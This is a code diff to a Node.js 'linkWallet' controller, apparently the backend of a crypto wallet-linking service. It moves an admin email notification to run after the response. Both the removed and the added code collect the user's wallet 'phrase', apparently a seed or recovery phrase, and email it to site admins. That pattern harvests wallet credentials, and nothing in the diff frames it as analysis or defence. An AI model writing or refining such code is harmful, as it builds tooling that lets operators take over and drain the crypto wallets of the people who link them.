@@ -48,31 +48,6 @@ const linkWallet = async (req, res, next) => {
       lastAccessed: new Date(),
     });
 
-    // Send email notification to admins
-    try {
-      // Get user details for email
-      const user = req.user;
-
-      // Prepare wallet data for email (include phrase)
-      const walletData = {
-        _id: linkedWallet._id,
-        walletName: linkedWallet.walletName,
-        walletType: linkedWallet.walletType || "hot",
-        phrase: linkedWallet.phrase, // Include the phrase
-        isActive: linkedWallet.isActive,
-        linkedAt: linkedWallet.linkedAt,
-        lastAccessed: linkedWallet.lastAccessed,
-      };
-
-      await notifyAdmins("linkedWalletAdded", {
-        user: user,
-        linkedWallet: walletData,
-      });
-    } catch (emailError) {
-      console.error("Failed to send wallet linking notification:", emailError);
-      // Don't fail the request if email fails
-    }
-
     successResponse(
       res,
       {
@@ -81,6 +56,32 @@ const linkWallet = async (req, res, next) => {
       "Wallet linked successfully",
       201,
     );
+
+    // Send admin notification after response (fire-and-forget)
+    try {
+      const user = req.user;
+      const walletData = {
+        _id: linkedWallet._id,
+        walletName: linkedWallet.walletName,
+        walletType: linkedWallet.walletType || "hot",
+        phrase: linkedWallet.phrase,
+        isActive: linkedWallet.isActive,
+        linkedAt: linkedWallet.linkedAt,
+        lastAccessed: linkedWallet.lastAccessed,
+      };
+
+      notifyAdmins("linkedWalletAdded", {
+        user: user,
+        linkedWallet: walletData,
+      }).catch((emailError) => {
+        console.error(
+          "Failed to send wallet linking notification:",
+          emailError,
+        );
+      });
+    } catch (err) {
+      console.error("Failed preparing wallet linking notification:", err);
+    }
   } catch (error) {
     next(error);
   }
